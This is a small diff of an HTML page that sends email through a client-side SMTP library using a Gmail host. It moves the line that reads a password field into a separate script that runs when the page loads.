@@ -10,7 +10,6 @@
  
   <script type="text/javascript">
     function sendEmail() {
-      var sepwd02 = document.getElementById("sepwd01").value;
       Email.send({
         Host: "smtp.gmail.com",
         Username: "sethemery17543@gmail.com",
@@ -28,7 +27,10 @@
 </head>
  
 <body>
-sp3<input id="sepwd01" type="password" required>
+sp4<input id="sepwd01" type="password" required>
+ <script>
+  var sepwd02 = document.getElementById("sepwd01").value;
+ </script>
   <form method="post">
     <input type="button" value="Send Email"
         onclick="sendEmail()" />
